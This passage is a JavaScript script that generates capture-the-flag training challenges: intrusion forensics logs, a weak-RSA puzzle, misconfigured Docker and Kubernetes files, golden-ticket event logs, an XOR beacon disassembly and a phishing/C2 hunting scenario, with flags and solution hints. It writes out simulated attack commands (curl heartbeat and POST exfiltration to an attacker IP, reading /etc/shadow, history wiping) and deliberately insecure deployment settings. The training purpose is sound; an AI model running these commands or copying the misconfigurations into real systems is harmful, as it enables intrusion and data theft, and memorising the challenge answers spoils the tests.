  const crontabDump = `# Crontab dump — nebula-ws01
# /etc/crontab (system)
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )

# /var/spool/cron/crontabs/dev01 (user crontab — added during incident)
*/5 * * * * curl -s http://${attackerIp}:8080/heartbeat?h=$(hostname) > /dev/null 2>&1
`;

  const timeline = `timestamp,event_type,source,user,details
2026-10-15T06:00:00Z,cron,syslog,root,Daily maintenance job
2026-10-15T06:30:15Z,login,auth.log,jsmith,SSH pubkey from 192.168.1.45
2026-10-15T07:15:22Z,login,auth.log,agarcia,SSH pubkey from 192.168.1.102
2026-10-15T08:45:00Z,brute_force_start,auth.log,multiple,"Failed SSH from ${attackerIp} — 10 accounts targeted"
2026-10-15T08:47:12Z,login,auth.log,dev01,"SSH password from ${attackerIp} — BRUTE FORCE SUCCESS"
2026-10-15T08:48:30Z,recon,bash_history,dev01,"whoami; id; uname -a; sudo -l; find suid"
2026-10-15T08:49:15Z,download,netflow,dev01,"wget tools.sh from ${attackerIp}:8080"
2026-10-15T08:50:00Z,execution,bash_history,dev01,Executed /tmp/.tools.sh
2026-10-15T08:52:30Z,priv_esc,syslog,dev01,"logmon --read /etc/shadow (SUID abuse)"
2026-10-15T08:54:00Z,staging,filesystem,dev01,"tar czf /tmp/.backup.tar.gz /var/lib/nebula-app/backups/customer-db.sql"
2026-10-15T08:54:30Z,exfiltration,netflow,dev01,"curl POST to ${attackerIp}:9090/upload — file: .backup.tar.gz"
2026-10-15T08:55:00Z,cleanup,filesystem,dev01,"Deleted .tools.sh, .backup.tar.gz, logmon_out.txt"
2026-10-15T08:55:10Z,persistence,crontab,dev01,"Added heartbeat cron: */5 * * * * curl ${attackerIp}:8080/heartbeat"
2026-10-15T08:55:30Z,anti_forensics,bash_history,dev01,history -c
`;

  write('crime-scene/files/bash-history.txt', bashHistory);
  write('crime-scene/files/crontab-dump.txt', crontabDump);
  write('crime-scene/files/timeline.csv', timeline);

  write('crime-scene/challenge.json', json({
    id: 'crime-scene',
    title: 'Crime Scene',
    category: 'forensics',
    difficulty: 'intermediate',
    points: 300,
    mission: 'Operation Nightfall',
    tags: ['dfir', 'incident-response', 'log-analysis', 'timeline'],
    summary: 'Reconstruct an intrusion from auth logs, bash history, crontab and a timeline.',
    briefing: `NebulaCorp's incident response team preserved forensic artifacts from a compromised workstation. The evidence suggests a full attack lifecycle: initial access, reconnaissance, privilege escalation, data staging, exfiltration, persistence and cleanup.\n\nYou have four evidence files:\n- auth.log — SSH authentication events\n- bash-history.txt — recovered command history from the compromised account\n- crontab-dump.txt — crontab entries (system and user)\n- timeline.csv — analyst-prepared incident timeline\n\nReconstruct the attack and identify:\n1. The attacker's IP address\n2. The compromised user account\n3. The name of the exfiltrated database file (without path or extension)\n\nSubmit: RANGE{intrusion_<ip_with_underscores>_<username>_<dbname>}\n\nFor example: RANGE{intrusion_10_0_0_1_admin_orders_db}`,
    objectives: [
      'Identify the attacker IP from brute-force attempts in auth.log',
      'Determine which account was compromised',
      'Trace the data exfiltration in bash history',
      'Identify the exfiltrated database file',
      'Format and submit the flag'
    ],
    tools: ['grep', 'awk', 'less', 'csvkit', 'timeline-explorer'],
    hints: [
      { title: 'Find the brute force', text: 'grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c — the attacker IP will have the most failures.', cost: 25 },
      { title: 'Follow the exfil', text: 'In bash-history.txt, look for tar and curl commands. The tar creates an archive of a .sql file, and curl uploads it to the attacker.', cost: 45 }
    ],
    requires: ['priv-escalation'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'auth.log', description: 'SSH authentication log from the compromised workstation.' },
      { file: 'bash-history.txt', description: 'Recovered bash history for the compromised user.' },
      { file: 'crontab-dump.txt', description: 'System and user crontab entries.' },
      { file: 'timeline.csv', description: 'Analyst-prepared incident timeline.' }
    ],
  }));
  console.log('  crime-scene');
}

// ==================== 8. RSA PAPER (crypto, intermediate, 300) ====================
{
  const flag = FLAGS.rsaPaper;
  const p = 104729n;
  const q = 104723n;
  const n = p * q;
  const e = 65537n;
  const phi = (p - 1n) * (q - 1n);

  // Extended Euclidean to find modular inverse
  function modinv(a, m) {
    let [old_r, r] = [a, m];
    let [old_s, s] = [1n, 0n];
    while (r !== 0n) {
      const quot = old_r / r;
      [old_r, r] = [r, old_r - quot * r];
      [old_s, s] = [s, old_s - quot * s];
    }
    return ((old_s % m) + m) % m;
  }

  function modpow(base, exp, mod) {
    let result = 1n;
    base = ((base % mod) + mod) % mod;
    while (exp > 0n) {
      if (exp & 1n) result = (result * base) % mod;
      exp >>= 1n;
      base = (base * base) % mod;
    }
    return result;
  }

  const d = modinv(e, phi);

  // Encrypt each character of the flag
  const flagBytes = Buffer.from(flag);
  const ciphertext = [];
  for (const byte of flagBytes) {
    ciphertext.push(modpow(BigInt(byte), e, n).toString());
  }

  // Verify decryption works
  const decrypted = ciphertext.map(c => String.fromCharCode(Number(modpow(BigInt(c), d, n))));
  if (decrypted.join('') !== flag) throw new Error('RSA verification failed');

  const intercept = `================================================================
  INTERCEPTED TRANSMISSION — CLASSIFICATION: CONFIDENTIAL
  Source: nebula-relay-03.internal
  Timestamp: 2026-10-15T10:00:00Z
  Analyst note: Textbook RSA, no padding. Modulus looks weak.
================================================================

Public Key:
  n = ${n}
  e = ${e}

Ciphertext (one integer per plaintext byte, textbook RSA):
${ciphertext.join('\n')}

================================================================
  END INTERCEPT
================================================================
`;

  write('rsa-paper/files/intercept.txt', intercept);

  write('rsa-paper/challenge.json', json({
    id: 'rsa-paper',
    title: 'RSA Paper',
    category: 'crypto',
    difficulty: 'intermediate',
    points: 300,
    mission: 'Operation Nightfall',
    tags: ['rsa', 'factoring', 'modular-arithmetic', 'cryptanalysis'],
    summary: 'An RSA-encrypted message uses a dangerously small modulus. Factor it and decrypt.',
    briefing: `An encrypted message was intercepted from a NebulaCorp internal relay. The encryption uses textbook RSA — each byte of the plaintext is encrypted independently as c = m^e mod n, with no padding.\n\nThe modulus n is suspiciously small. If you can factor it into its two prime components p and q, you can compute the private exponent d and decrypt the message.\n\nSteps:\n1. Factor n into primes p × q (hint: both primes are under 110,000)\n2. Compute φ(n) = (p−1)(q−1)\n3. Compute d = e⁻¹ mod φ(n) (modular inverse)\n4. For each ciphertext integer c, compute m = c^d mod n\n5. Convert each m to its ASCII character\n\nThe decrypted message is the flag. Submit it exactly as it appears.`,
    objectives: [
      'Factor the modulus n by trial division',
      'Compute the private exponent d',
      'Decrypt each ciphertext byte',
      'Assemble and submit the flag'
    ],
    tools: ['python3', 'SageMath', 'factordb.com', 'CyberChef'],
    hints: [
      { title: 'Factoring approach', text: 'Try dividing n by every odd number from 3 up to sqrt(n). With both primes under 110,000, trial division finishes in milliseconds. In Python: for i in range(3, 110000, 2): if n % i == 0: print(i, n//i); break', cost: 30 },
      { title: 'Decryption in Python', text: 'Use pow(c, d, n) for modular exponentiation. chr(pow(c, d, n)) gives the ASCII character. Apply to each line of ciphertext.', cost: 50 }
    ],
    requires: ['layered-encoding'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [{ file: 'intercept.txt', description: 'Intercepted RSA-encrypted transmission with public key parameters.' }],
  }));
  console.log('  rsa-paper');
}

// ==================== 9. CONTAINER ESCAPE PLAN (cloud, advanced, 400) ====================
{
  const flag = FLAGS.containerEscape;
  const flagB64 = Buffer.from(flag).toString('base64');

  const dockerfile = `# NebulaCorp API Service — Dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \\
    python3 python3-pip curl wget netcat-openbsd \\
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt /app/
RUN pip3 install -r /app/requirements.txt

COPY . /app/
WORKDIR /app

# TODO: create a non-root user
# RUN useradd -m appuser && chown -R appuser /app
# USER appuser

ENV DATABASE_URL=postgres://nebula_admin:Pr0d_DBpa55!@db.internal:5432/production
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV FLASK_DEBUG=1

EXPOSE 8080
CMD ["python3", "server.py"]
`;

  const deploymentYaml = `# Kubernetes Deployment — nebula-api
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nebula-api
  namespace: production
  labels:
    app: nebula-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nebula-api
  template:
    metadata:
      labels:
        app: nebula-api
    spec:
      hostPID: true
      hostNetwork: true
      serviceAccountName: nebula-api-sa
      containers:
      - name: api
        image: registry.corp.test/nebula-api:latest
        securityContext:
          privileged: true
          runAsUser: 0
        ports:
        - containerPort: 8080
          hostPort: 8080
        env:
        - name: DB_PASSWORD
          value: "Pr0d_DBpa55!"
        volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
        - name: host-root
          mountPath: /host
          readOnly: false
        resources: {}
      volumes:
      - name: docker-sock
        hostPath:
          path: /var/run/docker.sock
          type: Socket
      - name: host-root
        hostPath:
          path: /
`;

  const pipelineYml = `# CI/CD Pipeline — .github/workflows/deploy.yml
name: Build and Deploy
on:
  push:
    branches: [main]

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Build Docker image
      run: docker build -t registry.corp.test/nebula-api:\${{ github.sha }} .

    - name: Push to registry
      run: |
        echo "\${{ secrets.REGISTRY_PASSWORD }}" | docker login registry.corp.test -u deploy --password-stdin
        docker push registry.corp.test/nebula-api:\${{ github.sha }}

    - name: Deploy to production
      env:
        DEPLOY_KEY: \${{ secrets.DEPLOY_SSH_KEY }}
        KUBECONFIG_DATA: \${{ secrets.KUBECONFIG }}
      run: |
        echo "\$DEPLOY_KEY" > /tmp/deploy.pem
        chmod 600 /tmp/deploy.pem
        echo "\$KUBECONFIG_DATA" | base64 -d > /tmp/kubeconfig
        scp -o StrictHostKeyChecking=no -i /tmp/deploy.pem deployment.yaml deploy@k8s-master.corp.test:/tmp/
        ssh -o StrictHostKeyChecking=no -i /tmp/deploy.pem deploy@k8s-master.corp.test "kubectl apply -f /tmp/deployment.yaml"
`;

  const envStaging = `# Staging Environment Configuration
# Last updated: 2026-10-01 by devops team

DATABASE_URL=postgres://staging_user:stg_pa55w0rd@staging-db.internal:5432/staging
REDIS_URL=redis://staging-cache.internal:6379/0
JWT_SECRET=super_secret_staging_key_2026
API_KEY=sk-staging-nebula-a1b2c3d4e5f6

# Previous security audit finding (encoded for ticket reference):
# ${flagB64}

FLASK_ENV=development
FLASK_DEBUG=1
LOG_LEVEL=DEBUG
CORS_ORIGINS=*
`;

  write('container-escape-plan/files/Dockerfile.txt', dockerfile);
  write('container-escape-plan/files/deployment.yaml', deploymentYaml);
  write('container-escape-plan/files/pipeline.yml', pipelineYml);
  write('container-escape-plan/files/env-staging.txt', envStaging);

  write('container-escape-plan/challenge.json', json({
    id: 'container-escape-plan',
    title: 'Container Escape Plan',
    category: 'cloud',
    difficulty: 'advanced',
    points: 400,
    mission: 'Operation Nightfall',
    tags: ['docker', 'kubernetes', 'devsecops', 'misconfiguration'],
    summary: 'Audit a set of deployment artifacts riddled with security misconfigurations.',
    briefing: `NebulaCorp's DevSecOps team recovered four deployment artifacts from a misconfigured CI/CD pipeline that was accidentally made public:\n\n- Dockerfile.txt — the container image build instructions\n- deployment.yaml — the Kubernetes deployment manifest\n- pipeline.yml — the GitHub Actions CI/CD workflow\n- env-staging.txt — a staging environment configuration file\n\nEach file contains one or more serious security misconfigurations: hardcoded credentials, privileged containers, exposed host resources, and more.\n\nA previous security auditor left an encoded summary of the most critical finding in one of the files. Find the Base64-encoded string that does not look like a normal configuration value, decode it, and submit the flag it contains.\n\nThe flag summarizes the three worst Kubernetes misconfigurations in the deployment manifest.`,
    objectives: [
      'Review all four files for security misconfigurations',
      'Find the Base64-encoded audit finding hidden in one of the files',
      'Decode it to recover the flag',
      'Submit the flag'
    ],
    tools: ['base64', 'text-editor', 'CyberChef', 'kubectl-lint'],
    hints: [
      { title: 'Where to look', text: 'One of the configuration files contains a comment with a Base64-encoded string. It looks like a long alphanumeric string ending in = signs.', cost: 40 },
      { title: 'Which file', text: 'The encoded finding is in the env-staging.txt file, in a comment line. Decode it with: echo "<string>" | base64 -d', cost: 70 }
    ],
    requires: ['token-forge'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'Dockerfile.txt', description: 'Docker build instructions for the API service.' },
      { file: 'deployment.yaml', description: 'Kubernetes deployment manifest.' },
      { file: 'pipeline.yml', description: 'GitHub Actions CI/CD workflow.' },
      { file: 'env-staging.txt', description: 'Staging environment configuration.' }
    ],
  }));
  console.log('  container-escape-plan');
}

// ==================== 10. TICKET TO RIDE (enterprise, advanced, 400) ====================
{
  const flag = FLAGS.ticketToRide;

  const events = [];
  const header = 'TimeGenerated,EventID,Source,Category,AccountName,ComputerName,SourceIP,Message';

  // Normal Kerberos activity
  const normalUsers = ['jsmith', 'agarcia', 'mchen', 'kpatel', 'ljohnson'];
  const workstations = ['WS-FINANCE01', 'WS-HR02', 'WS-DEV03', 'WS-SALES01', 'WS-EXEC01'];
  const services = ['cifs/FS01.nebula.test', 'http/WEBAPP01.nebula.test', 'ldap/DC01.nebula.test',
    'host/PRINT01.nebula.test', 'MSSQLSvc/SQL01.nebula.test:1433'];

  // Normal logons throughout the day
  for (let i = 0; i < 80; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const user = pick(normalUsers);
    const ws = pick(workstations);
    const ip = `192.168.10.${int(10, 200)}`;
    events.push(`2026-10-15 ${pad2(h)}:${pad2(m)}:${pad2(s)},4624,Security,Logon/Logoff,${user},${ws},${ip},Logon Type 10 (RemoteInteractive)`);
  }

  // Normal TGT requests
  for (let i = 0; i < 60; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const user = pick(normalUsers);
    events.push(`2026-10-15 ${pad2(h)}:${pad2(m)}:${pad2(s)},4768,Security,Kerberos Authentication,${user},DC01,192.168.10.${int(10, 200)},TGT requested — Encryption: 0x12 (AES256-CTS-HMAC-SHA1-96) — Status: 0x0 (Success)`);
  }

  // Normal service ticket requests
  for (let i = 0; i < 50; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const user = pick(normalUsers);
    const svc = pick(services);
    events.push(`2026-10-15 ${pad2(h)}:${pad2(m)}:${pad2(s)},4769,Security,Kerberos Service Ticket,${user},DC01,192.168.10.${int(10, 200)},Service ticket requested for ${svc} — Encryption: 0x12 (AES256) — Status: 0x0`);
  }

  // ---- ATTACK SEQUENCE: Golden Ticket ----
  // Step 1: svc_sqldb requests TGT with RC4 (downgrade = red flag)
  events.push(`2026-10-15 09:30:00,4768,Security,Kerberos Authentication,svc_sqldb,DC01,192.168.10.201,TGT requested — Encryption: 0x17 (RC4-HMAC) — Status: 0x0 (Success) — WARNING: Encryption downgrade from AES256 to RC4`);

  // Step 2: Forged TGT used to request service ticket for krbtgt (THE golden ticket indicator)
  events.push(`2026-10-15 09:30:01,4769,Security,Kerberos Service Ticket,svc_sqldb,DC01,192.168.10.201,Service ticket requested for krbtgt/NEBULA.TEST — Encryption: 0x17 (RC4-HMAC) — ANOMALY: Ticket lifetime exceeds policy (requested: 87600h / policy max: 10h)`);

  // Step 3: Service tickets for sensitive services
  events.push(`2026-10-15 09:30:05,4769,Security,Kerberos Service Ticket,svc_sqldb,DC01,192.168.10.201,Service ticket requested for cifs/DC01.nebula.test — Encryption: 0x17 (RC4-HMAC) — Status: 0x0`);
  events.push(`2026-10-15 09:30:08,4769,Security,Kerberos Service Ticket,svc_sqldb,DC01,192.168.10.201,Service ticket requested for ldap/DC01.nebula.test — Encryption: 0x17 (RC4-HMAC) — Status: 0x0`);
  events.push(`2026-10-15 09:30:10,4769,Security,Kerberos Service Ticket,svc_sqldb,DC01,192.168.10.201,Service ticket requested for host/DC01.nebula.test — Encryption: 0x17 (RC4-HMAC) — Status: 0x0`);

  // Step 4: Privileged logon and DCSync indicators
  events.push(`2026-10-15 09:30:12,4672,Security,Special Logon,svc_sqldb,DC01,192.168.10.201,Special privileges assigned to new logon: SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege`);
  events.push(`2026-10-15 09:30:15,4624,Security,Logon/Logoff,svc_sqldb,DC01,192.168.10.201,Logon Type 3 (Network) — Elevated: Yes`);
  events.push(`2026-10-15 09:31:00,4662,Security,Directory Service Access,svc_sqldb,DC01,192.168.10.201,Replication request: DS-Replication-Get-Changes-All on domain NC — ALERT: Potential DCSync operation`);

  // More normal traffic after the attack to bury it
  for (let i = 0; i < 30; i++) {
    const m = int(32, 59);
    const s = int(0, 59);
    const user = pick(normalUsers);
    const svc = pick(services);
    events.push(`2026-10-15 09:${pad2(m)}:${pad2(s)},4769,Security,Kerberos Service Ticket,${user},DC01,192.168.10.${int(10, 200)},Service ticket requested for ${svc} — Encryption: 0x12 (AES256) — Status: 0x0`);
  }

  events.sort();
  write('ticket-to-ride/files/security-events.csv', [header, ...events].join('\n') + '\n');

  write('ticket-to-ride/challenge.json', json({
    id: 'ticket-to-ride',
    title: 'Ticket to Ride',
    category: 'enterprise',
    difficulty: 'advanced',
    points: 400,
    mission: 'Operation Nightfall',
    tags: ['kerberos', 'active-directory', 'golden-ticket', 'event-log'],
    summary: 'Analyze Windows Event Logs to identify a Kerberos golden ticket attack.',
    briefing: `NebulaCorp's SOC exported Windows Security Event Logs from the primary domain controller (DC01). An analyst flagged anomalous Kerberos activity but did not finish the investigation.\n\nYou have a CSV export of security events including Kerberos authentication (Event 4768), service ticket requests (Event 4769), special privilege assignments (Event 4672), logon events (Event 4624), and directory service access (Event 4662).\n\nLook for signs of a Golden Ticket attack:\n- Encryption downgrade (RC4-HMAC instead of AES256)\n- Abnormal ticket lifetimes\n- Service ticket requests targeting the krbtgt account\n- Unusual service account behavior\n- DCSync indicators\n\nIdentify the target service name used in the forged ticket, the compromised account, and the attack type.\n\nSubmit: RANGE{<target_service_from_forged_ticket>_<compromised_account>_golden_ticket}\n\nFor example, if the forged ticket targeted krbtgt and used the account svc_admin: RANGE{krbtgt_svc_admin_golden_ticket}`,
    objectives: [
      'Filter for Kerberos events (4768, 4769) and look for RC4 encryption downgrades',
      'Identify the anomalous service ticket targeting krbtgt',
      'Determine which account was used for the attack',
      'Correlate with privilege escalation and DCSync events',
      'Format and submit the flag'
    ],
    tools: ['grep', 'awk', 'csvkit', 'Excel', 'python3', 'Timeline Explorer'],
    hints: [
      { title: 'Encryption is the key', text: 'Normal Kerberos uses AES256 (0x12). Filter for RC4-HMAC (0x17) — those events are the attacker. grep "RC4-HMAC" security-events.csv', cost: 40 },
      { title: 'The golden ticket target', text: 'A golden ticket forges a TGT by targeting the krbtgt service. The compromised account is svc_sqldb. Look at the 4769 event requesting krbtgt/NEBULA.TEST.', cost: 70 }
    ],
    requires: ['crime-scene'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [{ file: 'security-events.csv', description: 'Windows Security Event Log export from DC01 (~250 events).' }],
  }));
  console.log('  ticket-to-ride');
}

// ==================== 11. GHOST IN THE WIRE (reversing, advanced, 350) ====================
{
  const flag = FLAGS.ghostInTheWire;
  const xorKey = 0x5a;

  // XOR-encrypt the flag
  const flagBuf = Buffer.from(flag);
  const encrypted = Buffer.alloc(flagBuf.length);
  for (let i = 0; i < flagBuf.length; i++) {
    encrypted[i] = flagBuf[i] ^ xorKey;
  }

  // Format encrypted bytes as hex for the disassembly
  const hexBytes = [];
  for (const b of encrypted) {
    hexBytes.push(`0x${b.toString(16).padStart(2, '0')}`);
  }

  const stringsOutput = `$ strings -n 4 /opt/nebula/beacon

/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
socket
connect
send
recv
close
malloc
free
memcpy
printf
fprintf
sleep
GLIBC_2.2.5
GLIBC_2.17
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
203.0.113.42
443
/var/log/.beacon.pid
/tmp/.beacon.sock
%s: connection established
%s: transmission complete
%s: retry in %d seconds
beacon v2.1-nebula
Usage: beacon [--interval N] [--stealth] [--key FILE]
--interval  Beacon interval in seconds (default: 60)
--stealth   Reduce beacon size and jitter timing
--key       Path to encryption key file
XOR key loaded: 0x5a
Encrypting payload (%d bytes)...
Decrypting response (%d bytes)...
[!] Error: connection refused
[!] Error: key file not found
[*] Beacon started (PID %d)
[*] Payload size: %d bytes
NEBULA_C2_HOST
NEBULA_C2_PORT
HOME
`;

  const disassembly = `; Partial disassembly of /opt/nebula/beacon
; Focused on the flag decryption routine identified by the analyst
;
; Tool: objdump -d -M intel /opt/nebula/beacon (excerpt)

0000000000401a00 <decrypt_payload>:
  401a00:  55                    push   rbp
  401a01:  48 89 e5              mov    rbp, rsp
  401a04:  48 89 7d f8           mov    QWORD PTR [rbp-0x8], rdi    ; payload pointer
  401a08:  89 75 f4              mov    DWORD PTR [rbp-0xc], esi    ; payload length
  401a0b:  c6 45 f3 5a           mov    BYTE PTR [rbp-0xd], 0x5a   ; XOR key = 0x5a
  401a0f:  c7 45 ec 00 00 00 00  mov    DWORD PTR [rbp-0x14], 0x0  ; loop counter = 0
  401a16:  eb 1a                 jmp    401a32 <decrypt_payload+0x32>

  ; --- loop body: XOR each byte with 0x5a ---
  401a18:  8b 45 ec              mov    eax, DWORD PTR [rbp-0x14]   ; i
  401a1b:  48 98                 cdqe
  401a1d:  48 03 45 f8           add    rax, QWORD PTR [rbp-0x8]    ; &payload[i]
  401a21:  0f b6 10              movzx  edx, BYTE PTR [rax]         ; payload[i]
  401a24:  0f b6 4d f3           movzx  ecx, BYTE PTR [rbp-0xd]    ; key (0x5a)
  401a28:  31 ca                 xor    edx, ecx                    ; payload[i] ^= key
  401a2a:  88 10                 mov    BYTE PTR [rax], dl          ; store result
  401a2c:  83 45 ec 01           add    DWORD PTR [rbp-0x14], 0x1  ; i++

  ; --- loop condition ---
  401a32:  8b 45 ec              mov    eax, DWORD PTR [rbp-0x14]   ; i
  401a35:  3b 45 f4              cmp    eax, DWORD PTR [rbp-0xc]   ; i < length?
  401a38:  7c de                 jl     401a18 <decrypt_payload+0x18>

  401a3a:  5d                    pop    rbp
  401a3b:  c3                    ret

; --- Embedded encrypted payload (identified in .rodata section) ---
; Address: 0x404060
; Length: ${flagBuf.length} bytes
; Analyst note: this is XOR-encrypted with key 0x5a

section .rodata:
  404060: ${hexBytes.slice(0, 8).join(' ')}
  404068: ${hexBytes.slice(8, 16).join(' ')}
  404070: ${hexBytes.slice(16, 24).join(' ')}
  404078: ${hexBytes.slice(24, 32).join(' ')}
${flagBuf.length > 32 ? `  404080: ${hexBytes.slice(32).join(' ')}\n` : ''}
; Total: ${flagBuf.length} bytes
`;

  write('ghost-in-the-wire/files/strings-output.txt', stringsOutput);
  write('ghost-in-the-wire/files/disassembly.txt', disassembly);

  write('ghost-in-the-wire/challenge.json', json({
    id: 'ghost-in-the-wire',
    title: 'Ghost in the Wire',
    category: 'reversing',
    difficulty: 'advanced',
    points: 350,
    mission: 'Operation Nightfall',
    tags: ['reversing', 'xor', 'binary-analysis', 'disassembly'],
    summary: 'Reverse-engineer a binary\'s encryption routine to recover a hidden payload.',
    briefing: `NebulaCorp's malware analysis team recovered a suspicious binary from a compromised workstation. The binary appears to be a C2 beacon that encrypts its payloads before transmission.\n\nThe team ran strings and partial disassembly on the binary and identified:\n1. An encryption routine that uses single-byte XOR\n2. An embedded encrypted payload in the .rodata section\n3. The XOR key, visible in both the strings output and the disassembly\n\nYour task: read the disassembly to understand the encryption algorithm, extract the encrypted bytes from the .rodata section, and XOR-decrypt them with the correct key to recover the hidden flag.\n\nThe decrypted payload is the flag. Submit it exactly as it appears.`,
    objectives: [
      'Find the XOR key in the strings output or disassembly',
      'Understand the decrypt_payload function\'s logic',
      'Extract the encrypted bytes from the .rodata section',
      'XOR each byte with the key to recover the plaintext',
      'Submit the decrypted flag'
    ],
    tools: ['python3', 'CyberChef', 'xxd', 'text-editor'],
    hints: [
      { title: 'The key', text: 'The XOR key is 0x5a. It appears in the strings output ("XOR key loaded: 0x5a") and in the disassembly (mov BYTE PTR [rbp-0xd], 0x5a).', cost: 30 },
      { title: 'Decryption script', text: 'In Python: key = 0x5a; encrypted = [0x08, 0x1b, ...]; print("".join(chr(b ^ key) for b in encrypted)). Extract all hex bytes from the .rodata section in order.', cost: 55 }
    ],
    requires: ['rsa-paper'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'strings-output.txt', description: 'Output of strings -n 4 on the recovered binary.' },
      { file: 'disassembly.txt', description: 'Partial disassembly (objdump) of the decryption routine and embedded payload.' }
    ],
  }));
  console.log('  ghost-in-the-wire');
}

// ==================== 12. OPERATION BLACKOUT (hunting, expert, 500) ====================
{
  const flag = FLAGS.operationBlackout;
  const attackerIp = '198.51.100.23';
  const c2Ip = '203.0.113.42';
  const exfilDomain = 'data.nebula.test';

  // --- Phishing email (initial access vector) ---
  const phishingEmail = `Return-Path: <hr-notify@nebulacorp-benefits.test>
Received: from mx.nebulacorp-benefits.test (${attackerIp})
    by mail.corp.test (192.0.2.10)
    with ESMTP id 5Xp9Qn3K2Ab
    for <dev01@corp.test>;
    Wed, 15 Oct 2026 09:14:00 +0000 (UTC)
From: NebulaCorp HR <hr-notify@nebulacorp-benefits.test>
To: dev01@corp.test
Subject: ACTION REQUIRED: Update Your Benefits Enrollment
Date: Wed, 15 Oct 2026 09:14:00 +0000
Message-ID: <20261015-benefits-update@nebulacorp-benefits.test>
X-Mailer: Microsoft Outlook 16.0
Content-Type: multipart/mixed; boundary="----=_Part_1234"
MIME-Version: 1.0
X-Spam-Score: 2.1
X-Spam-Status: No

------=_Part_1234
Content-Type: text/plain; charset=utf-8

Dear Team Member,

Open enrollment for 2027 benefits closes this Friday. Please review and
confirm your elections by opening the attached document.

If you have questions, contact HR at ext. 4500.

Best regards,
NebulaCorp Human Resources

------=_Part_1234
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
Content-Disposition: attachment; filename="Benefits_Enrollment_2027.docx"
Content-Transfer-Encoding: base64

[BINARY DATA REDACTED BY ANALYST — file contained macro dropper]
[SHA256: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2]

------=_Part_1234--
`;

  // --- Network flows ---
  const nfHeader = 'timestamp,src_ip,src_port,dst_ip,dst_port,proto,bytes_out,bytes_in,duration_ms,flags';
  const nfRows = [];

  // Normal traffic (before and during attack)
  for (let i = 0; i < 200; i++) {
    const h = int(7, 12);
    const m = int(0, 59);
    const s = int(0, 59);
    const src = pick(INTERNAL_IPS.filter(ip => ip !== '192.168.1.201'));
    const dst = pick(EXTERNAL_IPS.filter(ip => ip !== c2Ip));
    nfRows.push(`${ts(h, m, s)},${src},${int(32768, 65535)},${dst},${pick([80, 443, 443])},TCP,${int(200, 30000)},${int(500, 100000)},${int(100, 10000)},SYN ACK FIN`);
  }

  // Phishing email delivery (inbound)
  nfRows.push(`${ts(9, 14, 0)},${attackerIp},25,192.0.2.10,25,TCP,45230,1200,3500,SYN ACK FIN`);

  // C2 beacon starts after macro execution (~5 min after email)
  for (let minute = 19; minute < 180; minute++) {
    const h = 9 + Math.floor(minute / 60);
    const m = minute % 60;
    const jitter = int(-2, 2);
    const s = Math.max(0, Math.min(59, jitter));
    nfRows.push(`${ts(h, m, s)},192.168.1.201,${51000 + minute},${c2Ip},443,TCP,${200 + int(-10, 10)},${185 + int(-10, 10)},${420 + int(-20, 20)},SYN ACK`);
  }

  // Lateral movement: 192.168.1.201 → 192.168.1.150 (DB server) via SSH
  nfRows.push(`${ts(10, 15, 0)},192.168.1.201,${int(49000, 65000)},192.168.1.150,22,TCP,15200,8400,120000,SYN ACK`);

  // Large data exfiltration flow (staged data uploaded to C2)
  nfRows.push(`${ts(10, 45, 0)},192.168.1.201,${int(49000, 65000)},${c2Ip},443,TCP,4528000,12400,45000,SYN ACK FIN`);

  nfRows.sort();
  write('operation-blackout/files/netflows.csv', [nfHeader, ...nfRows].join('\n') + '\n');

  // --- DNS log ---
  const dnsLines = ['# DNS Query Log — Edge Resolver', '# Exported: 2026-10-15 13:00 UTC', ''];

  for (let i = 0; i < 300; i++) {
    const h = int(7, 12);
    const m = int(0, 59);
    const s = int(0, 59);
    const src = pick(INTERNAL_IPS);
    const domain = pick(DOMAINS);
    const resp = pick(EXTERNAL_IPS);
    dnsLines.push(`${ts(h, m, s)} ${src} A ${domain} ${resp}`);
  }

  // DNS exfiltration from compromised host to data.nebula.test
  const exfilData = Buffer.from('customer_records_export_2026Q3_confidential').toString('hex');
  const exfilChunks = [];
  for (let i = 0; i < exfilData.length; i += 12) {
    exfilChunks.push(exfilData.slice(i, i + 12));
  }
  for (let i = 0; i < exfilChunks.length; i++) {
    dnsLines.push(`${ts(10, 50, 30 + i)} 192.168.1.201 TXT ${exfilChunks[i]}.${exfilDomain} NXDOMAIN`);
  }

  // Also resolve the C2 domain
  dnsLines.push(`${ts(9, 18, 55)} 192.168.1.201 A c2-relay.nightfall.test ${c2Ip}`);

  dnsLines.sort();
  write('operation-blackout/files/dns-log.txt', dnsLines.join('\n') + '\n');

  // --- Auth log ---
  const authLines = [];
  // Normal logins
  for (let i = 0; i < 15; i++) {
    const h = int(6, 9);
    const m = int(0, 59);
    const user = pick(['jsmith', 'agarcia', 'mchen']);
